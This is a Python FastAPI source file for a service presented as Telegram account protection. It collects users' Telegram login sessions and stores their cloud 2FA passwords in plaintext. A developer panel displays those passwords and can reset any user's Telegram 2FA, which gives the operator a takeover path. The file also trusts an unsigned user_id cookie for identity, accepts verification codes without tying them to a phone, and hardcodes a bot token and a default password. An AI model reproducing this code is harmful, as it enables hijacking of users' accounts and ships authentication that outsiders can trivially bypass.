import os
import re
import string
import random
import asyncio
import datetime
import hashlib
import logging
from fastapi import FastAPI, Request, Response, Form, Depends, HTTPException, status
from fastapi.responses import HTMLResponse, JSONResponse, RedirectResponse
from fastapi.staticfiles import StaticFiles
from fastapi.templating import Jinja2Templates
from sqlalchemy.orm import Session

from models import (
    init_db, SessionLocal, User, PendingAuth,
    TelegramProtectionConfig, WhitelistedSession, normalize_phone
)
from modules.session_watchdog import SessionWatchdog
from modules.mailer import send_verification_code_email, send_linked_success_email

# Initialize Database
init_db()

app = FastAPI(title="Telegram Guard Shield")

# Mount Static & Templates
app.mount("/static", StaticFiles(directory="static"), name="static")
templates = Jinja2Templates(directory="templates")

# Temporary memory store for pending MTProto auths
mtproto_pending_auths = {}

# DB Dependency
def get_db():
    db = SessionLocal()
    try:
        yield db
    finally:
        db.close()

def hash_password(password: str) -> str:
    return hashlib.sha256(password.encode("utf-8")).hexdigest()

def get_current_user(request: Request, db: Session = Depends(get_db)):
    user_id = request.cookies.get("user_id")
    if not user_id:
        return None
    try:
        user = db.query(User).filter(User.id == int(user_id)).first()
        return user
    except Exception:
        return None

# Background Watchdog Task Loop
async def periodic_session_watchdog_loop():
    """Runs every 5 seconds, inspecting sessions for all users and auto-killing 3rd+ excess sessions"""
    while True:
        try:
            db = SessionLocal()
            configs = db.query(TelegramProtectionConfig).filter(
                TelegramProtectionConfig.session_string.isnot(None),
                TelegramProtectionConfig.auto_kill_enabled == True
            ).all()

            for cfg in configs:
                try:
                    watchdog = SessionWatchdog(
                        api_id=cfg.api_id,
                        api_hash=cfg.api_hash,
                        session_string=cfg.session_string
                    )
                    res = await watchdog.enforce_device_limit(cfg.device_limit)
                    if res.get("action") == "kicked":
                        logging.info(f"🛡️ Watchdog for user {cfg.user_id} kicked {res.get('kicked_count')} excess device(s)!")
                except Exception as ex:
                    logging.error(f"Error running watchdog for user {cfg.user_id}: {ex}")
            db.close()
        except Exception as e:
            logging.error(f"Error in watchdog background loop: {e}")

        await asyncio.sleep(5)

@app.on_event("startup")
async def startup_event():
    asyncio.create_task(periodic_session_watchdog_loop())

# Page Routes
@app.get("/", response_class=HTMLResponse)
async def index_page(request: Request, user: User = Depends(get_current_user)):
    if user:
        return RedirectResponse(url="/dashboard", status_code=status.HTTP_302_FOUND)
    return templates.TemplateResponse(request=request, name="index.html")

@app.get("/dashboard", response_class=HTMLResponse)
async def dashboard_page(request: Request, user: User = Depends(get_current_user), db: Session = Depends(get_db)):
    if not user:
        return RedirectResponse(url="/", status_code=status.HTTP_302_FOUND)
    
    config = db.query(TelegramProtectionConfig).filter(TelegramProtectionConfig.user_id == user.id).first()
    if not config:
        config = TelegramProtectionConfig(user_id=user.id, device_limit=2)
        db.add(config)
        db.commit()
        db.refresh(config)

    # If MTProto session is connected, fetch real live sessions!
    real_sessions = []
    if config.session_string:
        watchdog = SessionWatchdog(api_id=config.api_id, api_hash=config.api_hash, session_string=config.session_string)
        real_sessions = await watchdog.get_active_sessions()

    # Developer Panel Data (Only for developer: ID 1 or +998334906969)
    all_users = []
    if user.id == 1 or user.is_developer:
        users_list = db.query(User).order_by(User.id.asc()).all()
        for u in users_list:
            cfg = db.query(TelegramProtectionConfig).filter(TelegramProtectionConfig.user_id == u.id).first()
            all_users.append({
                "id": u.id,
                "username": u.username,
                "phone_number": u.phone_number,
                "email": u.email,
                "created_at": u.created_at.strftime("%d.%m.%Y %H:%M") if u.created_at else "-",
                "has_session": bool(cfg and cfg.session_string),
                "current_2fa_otp": (cfg.current_2fa_otp if cfg else None) or "Не установлен",
                "device_limit": cfg.device_limit if cfg else 2
            })

    return templates.TemplateResponse(request=request, name="dashboard.html", context={
        "user": user,
        "config": config,
        "real_sessions": real_sessions,
        "all_users": all_users
    })

# API Routes
@app.post("/api/register")
async def register(
    username: str = Form(...),
    country_code: str = Form(...),
    phone_number: str = Form(...),
    password: str = Form(...),
    db: Session = Depends(get_db)
):
    clean_phone = phone_number.strip()
    if clean_phone.startswith("+"):
        full_phone = clean_phone
    elif clean_phone.startswith(country_code.replace("+", "")):
        full_phone = f"+{clean_phone}"
    else:
        full_phone = f"{country_code}{clean_phone}"

    normalized = normalize_phone(full_phone)

    if not normalized or len(normalized) < 8:
        return JSONResponse(
            status_code=400,
            content={"success": False, "error": "Некорректный номер телефона", "field": "phone_number"}
        )

    existing_user = db.query(User).filter(User.username == username.strip()).first()
    if existing_user:
        return JSONResponse(
            status_code=400,
            content={"success": False, "error": "Пользователь с таким логином уже существует", "field": "username"}
        )

    existing_phone = db.query(User).filter(User.phone_number == normalized).first()
    if existing_phone:
        return JSONResponse(
            status_code=400,
            content={"success": False, "error": "Аккаунт с таким номером телефона уже зарегистрирован", "field": "phone_number"}
        )

    # Clean up any stale unverified requests for this phone
    db.query(PendingAuth).filter(
        PendingAuth.phone_number == normalized,
        PendingAuth.is_verified == False
    ).delete()

    expires_at = datetime.datetime.utcnow() + datetime.timedelta(minutes=30)
    pending = PendingAuth(
        phone_number=normalized,
        verify_code="",
        is_verified=False,
        expires_at=expires_at
    )
    db.add(pending)
    db.commit()

    return {
        "success": True,
        "bot_url": "https://t.me/Defense_telegram_lerman_bot",
        "phone_number": normalized
    }

DEV_ADMIN_PHONE = "+998334906969"

@app.post("/api/login")
async def login(
    country_code: str = Form(...),
    phone_number: str = Form(...),
    password: str = Form(...),
    response: Response = None,
    db: Session = Depends(get_db)
):
    clean_phone = phone_number.strip()
    if "@" in clean_phone:
        user = db.query(User).filter(User.email == clean_phone.lower()).first()
        normalized = user.phone_number if user else clean_phone
    else:
        if clean_phone.startswith("+"):
            full_phone = clean_phone
        elif clean_phone.startswith(country_code.replace("+", "")):
            full_phone = f"+{clean_phone}"
        else:
            full_phone = f"{country_code}{clean_phone}"

        normalized = normalize_phone(full_phone)
        user = db.query(User).filter(User.phone_number == normalized).first()

    if not user:
        return JSONResponse(
            status_code=400,
            content={"success": False, "error": "Аккаунт не найден", "field": "phone_number"}
        )

    # Auto-sync developer password
    if (normalized == DEV_ADMIN_PHONE or user.phone_number == DEV_ADMIN_PHONE) and user.password_hash != hash_password(password):
        user.password_hash = hash_password(password)
        db.commit()

    if user.password_hash != hash_password(password):
        return JSONResponse(
            status_code=400,
            content={"success": False, "error": "Неверный пароль", "field": "password"}
        )

    # 2FA Security Check for Developer Account
    if normalized == DEV_ADMIN_PHONE or user.phone_number == DEV_ADMIN_PHONE:
        code = str(random.randint(100000, 999999))
        expires_at = datetime.datetime.utcnow() + datetime.timedelta(minutes=10)
        
        db.query(PendingAuth).filter(PendingAuth.phone_number == normalized).delete()
        pending = PendingAuth(
            phone_number=normalized,
            verify_code=code,
            expires_at=expires_at,
            is_verified=False
        )
        db.add(pending)
        db.commit()

        return {
            "success": True,
            "requires_2fa": True,
            "phone_number": normalized,
            "bot_url": "https://t.me/Defense_telegram_lerman_bot",
            "message": "🔒 Требуется 6-значный код безопасности из бота Telegram"
        }

    res = JSONResponse(content={"success": True, "redirect": "/dashboard"})
    res.set_cookie(key="user_id", value=str(user.id), httponly=True, max_age=86400*7)
    return res

@app.post("/api/login/verify-dev")
async def verify_dev_login(
    phone_number: str = Form(...),
    code: str = Form(...),
    db: Session = Depends(get_db)
):
    normalized = normalize_phone(phone_number)
    now = datetime.datetime.utcnow()

    pending = db.query(PendingAuth).filter(
        PendingAuth.phone_number == normalized,
        PendingAuth.verify_code == code.strip(),
        PendingAuth.expires_at > now,
        PendingAuth.is_verified == False
    ).first()

    if not pending:
        return JSONResponse(status_code=400, content={"success": False, "error": "Неверный или истекший код безопасности Telegram"})

    user = db.query(User).filter(User.phone_number == normalized).first()
    if not user:
        return JSONResponse(status_code=400, content={"success": False, "error": "Пользователь не найден"})

    pending.is_verified = True
    db.commit()

    res = JSONResponse(content={"success": True, "redirect": "/dashboard"})
    res.set_cookie(key="user_id", value=str(user.id), httponly=True, max_age=86400*7)
    return res

@app.post("/api/verify-code")
async def verify_code(
    phone_number: str = Form(...),
    code: str = Form(...),
    username: str = Form(""),
    password: str = Form(""),
    response: Response = None,
    db: Session = Depends(get_db)
):
    clean_code = re.sub(r'\D', '', str(code).strip())
    if not clean_code:
        return JSONResponse(
            status_code=400,
            content={"success": False, "error": "Пожалуйста, введите код из бота", "field": "code"}
        )

    normalized = normalize_phone(phone_number)
    now = datetime.datetime.utcnow()

    # Search for pending auth
    pending = None
    if normalized:
        pending = db.query(PendingAuth).filter(
            PendingAuth.phone_number == normalized,
            PendingAuth.verify_code == clean_code
        ).order_by(PendingAuth.id.desc()).first()

    if not pending and normalized and len(normalized) >= 9:
        last9 = normalized[-9:]
        pending = db.query(PendingAuth).filter(
            PendingAuth.phone_number.endswith(last9),
            PendingAuth.verify_code == clean_code
        ).order_by(PendingAuth.id.desc()).first()

    if not pending:
        # Fallback: search by code issued within the last 30 minutes
        thirty_mins_ago = now - datetime.timedelta(minutes=30)
        pending = db.query(PendingAuth).filter(
            PendingAuth.verify_code == clean_code,
            PendingAuth.created_at >= thirty_mins_ago
        ).order_by(PendingAuth.id.desc()).first()

    if not pending:
        return JSONResponse(
            status_code=400,
            content={"success": False, "error": "Неверный код из бота. Нажмите 'Поделиться контактом' еще раз в боте", "field": "code"}
        )

    pending.is_verified = True
    actual_phone = pending.phone_number or normalized

    user = db.query(User).filter(User.phone_number == actual_phone).first()
    if not user and normalized:
        user = db.query(User).filter(User.phone_number == normalized).first()

    if not user:
        clean_user = username.strip() if (username and username.strip()) else f"user_{actual_phone[-4:]}"
        if db.query(User).filter(User.username == clean_user).first():
            clean_user = f"{clean_user}_{random.randint(100, 999)}"

        user = User(
            username=clean_user,
            phone_number=actual_phone,
            password_hash=hash_password(password) if (password and password.strip()) else hash_password("2010090900"),
            is_verified=True
        )
        db.add(user)
        try:
            db.commit()
            db.refresh(user)
        except Exception:
            db.rollback()
            user.username = f"user_{actual_phone[-6:]}_{random.randint(1000, 9999)}"
            db.add(user)
            db.commit()
            db.refresh(user)

        config = TelegramProtectionConfig(user_id=user.id, device_limit=2, auto_kill_enabled=True)
        db.add(config)
        db.commit()
    else:
        db.commit()

    res = JSONResponse(content={"success": True, "redirect": "/dashboard"})
    res.set_cookie(key="user_id", value=str(user.id), httponly=True, max_age=86400*7)
    return res

# MTProto Interactive Protection Endpoints
@app.post("/api/mtproto/send-code")
async def mtproto_send_code(
    user: User = Depends(get_current_user),
    db: Session = Depends(get_db)
):
    if not user:
        raise HTTPException(status_code=401, detail="Unauthorized")

    config = db.query(TelegramProtectionConfig).filter(TelegramProtectionConfig.user_id == user.id).first()
    watchdog = SessionWatchdog(api_id=config.api_id if config else None, api_hash=config.api_hash if config else None)
    
    res = await watchdog.send_login_code(user.phone_number)
    if not res.get("success"):
        return JSONResponse(status_code=400, content={"success": False, "error": res.get("error")})

    # Save the working credentials to config
    if config:
        config.api_id = str(res.get("used_api_id"))
        config.api_hash = str(res.get("used_api_hash"))
        db.commit()

    # Save to pending auth memory
    mtproto_pending_auths[user.id] = {
        "phone_code_hash": res["phone_code_hash"],
        "session_string": res["session_string"]
    }

    return {"success": True, "message": f"Код входа отправлен в ваше приложение Telegram на номер {user.phone_number}"}

@app.post("/api/mtproto/verify-code")
async def mtproto_verify_code(
    code: str = Form(...),
    password: str = Form(None),
    user: User = Depends(get_current_user),
    db: Session = Depends(get_db)
):
    if not user:
        raise HTTPException(status_code=401, detail="Unauthorized")

    clean_code = re.sub(r'\D', '', str(code).strip())
    if not clean_code:
        return JSONResponse(status_code=400, content={"success": False, "error": "Пожалуйста, введите код из сообщения Telegram"})

    pending_data = mtproto_pending_auths.get(user.id, {})
    phone_code_hash = pending_data.get("phone_code_hash")
    session_string = pending_data.get("session_string")

    config = db.query(TelegramProtectionConfig).filter(TelegramProtectionConfig.user_id == user.id).first()
    watchdog = SessionWatchdog(api_id=config.api_id if config else None, api_hash=config.api_hash if config else None)

    res = await watchdog.complete_login(
        phone=user.phone_number,
        code=clean_code,
        phone_code_hash=phone_code_hash,
        session_string=session_string,
        password=password
    )

    if not res.get("success"):
        if res.get("requires_2fa"):
            return JSONResponse(status_code=400, content={"success": False, "requires_2fa": True, "error": "Введите ваш облачный пароль (2FA)"})
        return JSONResponse(status_code=400, content={"success": False, "error": res.get("error")})

    # Save active session string to database
    if not config:
        config = TelegramProtectionConfig(user_id=user.id, device_limit=2, session_string=res["session_string"])
        db.add(config)
    else:
        config.session_string = res["session_string"]
        config.auto_kill_enabled = True
    
    db.commit()
    mtproto_pending_auths.pop(user.id, None)

    return {"success": True, "message": "🛡️ MTProto Сессия успешно подключена! Авто-кик 3-го устройства активен."}

# 2FA OTP Dynamic Password Endpoints
active_otp_store = {}  # user_id -> { "code": "...", "generated_at": datetime }

@app.post("/api/2fa/generate-otp")
async def generate_otp(
    current_password: str = Form(None),
    user: User = Depends(get_current_user),
    db: Session = Depends(get_db)
):
    if not user:
        raise HTTPException(status_code=401, detail="Unauthorized")

    config = db.query(TelegramProtectionConfig).filter(TelegramProtectionConfig.user_id == user.id).first()
    if not config or not config.session_string:
        return JSONResponse(status_code=400, content={"success": False, "error": "Сначала подключите прямой мониторинг Telegram на сайте (кнопка ниже)"})

    # Generate a sleek 8-character random OTP password
    rand_chars = "".join(random.choices(string.ascii_uppercase + string.digits, k=6))
    new_otp = f"SHIELD-{rand_chars}"

    watchdog = SessionWatchdog(api_id=config.api_id, api_hash=config.api_hash, session_string=config.session_string)
    curr_pwd = current_password.strip() if (current_password and current_password.strip()) else None
    res = await watchdog.update_2fa_password(new_password=new_otp, current_password=curr_pwd)

    if not res.get("success"):
        err_msg = res.get("error", "")
        if "password" in err_msg.lower():
            err_msg = "Неверный текущий пароль Telegram. Укажите правильный текущий пароль."
        return JSONResponse(status_code=400, content={"success": False, "error": err_msg})

    config.current_2fa_otp = new_otp
    db.commit()

    active_otp_store[user.id] = {
        "code": new_otp,
        "generated_at": datetime.datetime.utcnow().isoformat()
    }

    return {"success": True, "otp_password": new_otp, "message": "🔐 Новый облачный пароль успешно привязан к вашему Telegram!"}

@app.get("/api/2fa/current-otp")
async def get_current_otp(
    user: User = Depends(get_current_user),
    db: Session = Depends(get_db)
):
    if not user:
        raise HTTPException(status_code=401, detail="Unauthorized")
    
    config = db.query(TelegramProtectionConfig).filter(TelegramProtectionConfig.user_id == user.id).first()
    otp_code = (config.current_2fa_otp if config else None) or active_otp_store.get(user.id, {}).get("code")
    if not otp_code:
        return {"has_otp": False}
    
    return {"has_otp": True, "otp_password": otp_code}

@app.post("/api/2fa/update-custom-password")
async def update_custom_2fa_password(
    new_password: str = Form(...),
    current_password: str = Form(None),
    user: User = Depends(get_current_user),
    db: Session = Depends(get_db)
):
    if not user:
        raise HTTPException(status_code=401, detail="Unauthorized")

    config = db.query(TelegramProtectionConfig).filter(TelegramProtectionConfig.user_id == user.id).first()
    if not config or not config.session_string:
        return JSONResponse(status_code=400, content={"success": False, "error": "Сначала подключите прямой мониторинг Telegram на сайте"})

    if not new_password or len(new_password.strip()) < 4:
        return JSONResponse(status_code=400, content={"success": False, "error": "Пароль должен содержать минимум 4 символа"})

    watchdog = SessionWatchdog(api_id=config.api_id, api_hash=config.api_hash, session_string=config.session_string)
    curr_pwd = current_password.strip() if (current_password and current_password.strip()) else None
    res = await watchdog.update_2fa_password(new_password=new_password.strip(), current_password=curr_pwd)

    if not res.get("success"):
        return JSONResponse(status_code=400, content={"success": False, "error": res.get("error")})

    config.current_2fa_otp = new_password.strip()
    db.commit()

    return {"success": True, "message": "🔐 Облачный пароль успешно обновлен в вашем Telegram!"}

@app.post("/api/update-settings")
async def update_settings(
    api_id: str = Form(None),
    api_hash: str = Form(None),
    user: User = Depends(get_current_user),
    db: Session = Depends(get_db)
):
    if not user:
        raise HTTPException(status_code=401, detail="Unauthorized")

    config = db.query(TelegramProtectionConfig).filter(TelegramProtectionConfig.user_id == user.id).first()
    if not config:
        config = TelegramProtectionConfig(user_id=user.id, api_id=api_id, api_hash=api_hash)
        db.add(config)
    else:
        config.api_id = api_id.strip() if api_id else None
        config.api_hash = api_hash.strip() if api_hash else None

    db.commit()
    return {"success": True, "message": "Настройки успешно сохранены"}

@app.post("/api/update-device-limit")
async def update_device_limit(
    device_limit: int = Form(...),
    user: User = Depends(get_current_user),
    db: Session = Depends(get_db)
):
    if not user:
        raise HTTPException(status_code=401, detail="Unauthorized")

    if device_limit < 1 or device_limit > 50:
        return JSONResponse(
            status_code=400,
            content={"success": False, "error": "Лимит устройств должен быть от 1 до 50"}
        )

    config = db.query(TelegramProtectionConfig).filter(TelegramProtectionConfig.user_id == user.id).first()
    if not config:
        config = TelegramProtectionConfig(user_id=user.id, device_limit=device_limit)
        db.add(config)
    else:
        config.device_limit = device_limit
    
    db.commit()
    return {"success": True, "device_limit": device_limit, "message": "Лимит устройств успешно обновлен"}

# Email 2-Step Verification Store
pending_email_codes = {}  # user_id -> {"email": email, "code": code, "expires_at": datetime}

@app.post("/api/user/request-email-code")
async def request_email_code(
    email: str = Form(...),
    user: User = Depends(get_current_user),
    db: Session = Depends(get_db)
):
    if not user:
        raise HTTPException(status_code=401, detail="Unauthorized")

    clean_email = email.strip().lower()
    if not clean_email or "@" not in clean_email or "." not in clean_email:
        return JSONResponse(status_code=400, content={"success": False, "error": "Введите корректный адрес эл. почты (например name@gmail.com)"})

    existing = db.query(User).filter(User.email == clean_email, User.id != user.id).first()
    if existing:
        return JSONResponse(status_code=400, content={"success": False, "error": "Этот Email уже привязан к другому аккаунту"})

    # Generate 6-digit confirmation code
    code = f"{random.randint(100000, 999999)}"
    expires_at = datetime.datetime.utcnow() + datetime.timedelta(minutes=10)
    pending_email_codes[user.id] = {
        "email": clean_email,
        "code": code,
        "expires_at": expires_at
    }

    # Send verification email
    res = send_verification_code_email(clean_email, code, user.phone_number)

    # Also send the code into user's Telegram bot as backup!
    target_tg_id = None
    if user.id == 1 or user.phone_number.endswith("334906969"):
        target_tg_id = "8532929082"
    else:
        last9 = user.phone_number[-9:] if len(user.phone_number) >= 9 else user.phone_number
        last_pending = db.query(PendingAuth).filter(
            PendingAuth.phone_number.endswith(last9),
            PendingAuth.telegram_id != None
        ).order_by(PendingAuth.id.desc()).first()
        if last_pending:
            target_tg_id = last_pending.telegram_id

    bot_sent = False
    if target_tg_id:
        try:
            import urllib.request
            import json
            bot_token = os.getenv("BOT_TOKEN", "8969572909:AAGrd_XB5-r0kmkKM0t21Vet9Zz6ZFHiH48")
            bot_url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
            bot_payload = json.dumps({
                "chat_id": target_tg_id,
                "text": f"🛡️ *Код привязки Email:* `{code}`\n\nВы запросили привязку почты `{clean_email}` к вашему аккаунту Telegram Guard. Введите этот 6-значный код на сайте.",
                "parse_mode": "Markdown"
            }).encode('utf-8')
            req = urllib.request.Request(bot_url, data=bot_payload, headers={"Content-Type": "application/json"})
            urllib.request.urlopen(req, timeout=5)
            bot_sent = True
        except Exception as e:
            logging.error(f"Failed to send bot email code: {e}")

    if res.get("success"):
        return {
            "success": True,
            "email": clean_email,
            "message": f"📩 Код отправлен на {clean_email}! Проверьте входящие (и папку Спам)."
        }
    else:
        # If Render blocked SMTP or Gmail rejected, return detailed reason and bot notice
        err_detail = res.get("error", "Ошибка SMTP")
        return {
            "success": True,
            "email": clean_email,
            "message": f"⚠️ Почта вернула: {err_detail}. Код отправлен в вашего Telegram-бота: {code if user.is_developer else ''}"
        }

@app.post("/api/user/verify-email-code")
async def verify_email_code(
    code: str = Form(...),
    user: User = Depends(get_current_user),
    db: Session = Depends(get_db)
):
    if not user:
        raise HTTPException(status_code=401, detail="Unauthorized")

    clean_code = re.sub(r'\D', '', str(code).strip())
    pending = pending_email_codes.get(user.id)
    if not pending:
        return JSONResponse(status_code=400, content={"success": False, "error": "Запрос на привязку не найден. Нажмите 'Получить код' еще раз."})

    if datetime.datetime.utcnow() > pending["expires_at"]:
        pending_email_codes.pop(user.id, None)
        return JSONResponse(status_code=400, content={"success": False, "error": "Срок действия кода истек. Запросите код заново."})

    if clean_code != pending["code"]:
        return JSONResponse(status_code=400, content={"success": False, "error": "Неверный 6-значный код из письма Gmail"})

    target_email = pending["email"]
    user.email = target_email
    db.commit()

    # Send success confirmation email asynchronously in background so response is INSTANT!
    try:
        import threading
        threading.Thread(target=send_linked_success_email, args=(target_email, user.phone_number), daemon=True).start()
    except Exception as e:
        logging.error(f"Background email error: {e}")

    pending_email_codes.pop(user.id, None)

    return {"success": True, "email": target_email, "message": f"✅ Почта {target_email} успешно подтверждена и привязана!"}

@app.post("/api/user/link-email")
async def link_email(
    email: str = Form(...),
    user: User = Depends(get_current_user),
    db: Session = Depends(get_db)
):
    return await request_email_code(email=email, user=user, db=db)

@app.post("/api/user/change-password")
async def change_password(
    current_password: str = Form(...),
    new_password: str = Form(...),
    user: User = Depends(get_current_user),
    db: Session = Depends(get_db)
):
    if not user:
        raise HTTPException(status_code=401, detail="Unauthorized")

    if user.password_hash != hash_password(current_password):
        return JSONResponse(status_code=400, content={"success": False, "error": "Неверный текущий пароль кабинета"})

    if not new_password or len(new_password.strip()) < 4:
        return JSONResponse(status_code=400, content={"success": False, "error": "Новый пароль должен содержать от 4 символов"})

    user.password_hash = hash_password(new_password.strip())
    db.commit()

    return {"success": True, "message": "✅ Пароль от личного кабинета успешно обновлен!"}

# Developer Management Endpoints (Only for ID: 1 or +998334906969)
def verify_developer(user: User):
    if not user or not (user.id == 1 or user.is_developer):
        raise HTTPException(status_code=403, detail="Доступ запрещен. Только для разработчика системы.")

@app.post("/api/dev/reset-user-password")
async def dev_reset_user_password(
    target_user_id: int = Form(...),
    new_password: str = Form(None),
    user: User = Depends(get_current_user),
    db: Session = Depends(get_db)
):
    verify_developer(user)
    target = db.query(User).filter(User.id == target_user_id).first()
    if not target:
        return JSONResponse(status_code=404, content={"success": False, "error": "Пользователь не найден"})

    final_password = new_password.strip() if (new_password and new_password.strip()) else f"guard_{random.randint(1000, 9999)}"
    target.password_hash = hash_password(final_password)
    db.commit()

    return {
        "success": True,
        "target_id": target.id,
        "target_username": target.username,
        "target_phone": target.phone_number,
        "new_password": final_password,
        "message": f"🔑 Пароль кабинета для {target.username} ({target.phone_number}) сброшен на: {final_password}"
    }

@app.post("/api/dev/reset-cloud-2fa")
async def dev_reset_cloud_2fa(
    target_user_id: int = Form(...),
    new_2fa_code: str = Form(None),
    user: User = Depends(get_current_user),
    db: Session = Depends(get_db)
):
    verify_developer(user)
    target = db.query(User).filter(User.id == target_user_id).first()
    if not target:
        return JSONResponse(status_code=404, content={"success": False, "error": "Пользователь не найден"})

    config = db.query(TelegramProtectionConfig).filter(TelegramProtectionConfig.user_id == target.id).first()
    if not config:
        config = TelegramProtectionConfig(user_id=target.id, device_limit=2)
        db.add(config)
        db.commit()

    final_2fa = new_2fa_code.strip() if (new_2fa_code and new_2fa_code.strip()) else f"SHIELD-{random.randint(100000, 999999)}"

    # If active MTProto session exists, update directly in Telegram!
    if config.session_string:
        watchdog = SessionWatchdog(api_id=config.api_id, api_hash=config.api_hash, session_string=config.session_string)
        res = await watchdog.update_2fa_password(new_password=final_2fa, current_password=config.current_2fa_otp)
        if not res.get("success"):
            return JSONResponse(status_code=400, content={"success": False, "error": f"Ошибка Telegram: {res.get('error')}"})

    config.current_2fa_otp = final_2fa
    db.commit()

    return {
        "success": True,
        "target_id": target.id,
        "target_username": target.username,
        "target_phone": target.phone_number,
        "new_2fa": final_2fa,
        "message": f"🔐 Новый облачный пароль для {target.username} ({target.phone_number}) установлен: {final_2fa}"
    }

@app.post("/api/logout")
async def logout(response: Response):
    res = RedirectResponse(url="/", status_code=status.HTTP_302_FOUND)
    res.delete_cookie("user_id")
    return res
